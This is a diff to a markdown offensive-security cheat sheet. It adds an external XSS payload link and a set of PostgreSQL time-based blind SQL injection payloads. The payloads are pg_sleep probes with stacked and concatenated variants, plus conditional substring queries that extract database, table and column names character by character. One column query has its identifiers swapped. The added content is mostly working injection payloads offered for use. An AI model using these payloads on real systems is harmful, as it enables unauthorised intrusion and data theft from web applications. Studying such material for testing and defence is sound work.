@@ -22,7 +22,8 @@
 
 
 ## Cross-Site Scripting Section
-You can find an injection point with some payloads from this repository - [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
+You can find an injection point with some payloads from this repository - [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) <br>
+Also here - [XSS Payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all)
 
 ### Bypass restrictions method 1
 Sometimes we found a XSS injection point but with some keyword restrictions, so we have to bypass these restrictions with some techniques like below.
@@ -62,6 +63,32 @@ With <b>`<meta>`</b> html tag we can redirect the "victim" to our javascript inj
 ## SQL Injection Section
 
 ### PostgreSQL
+#### Time Based
+Identify time based
+```sql
+select 1 from pg_sleep(5)
+;(select 1 from pg_sleep(5))
+||(select 1 from pg_sleep(5))
+```
+
+Database Dump Time Based<br>
+
+```sql
+select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
+```
+
+Table Dump Time Based <br>
+
+```sql
+select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
+```
+
+Columns Dump Time Based <br>
+```sql
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name where column_name='value' limit 1
+```
+
 
 ### MySQL
 
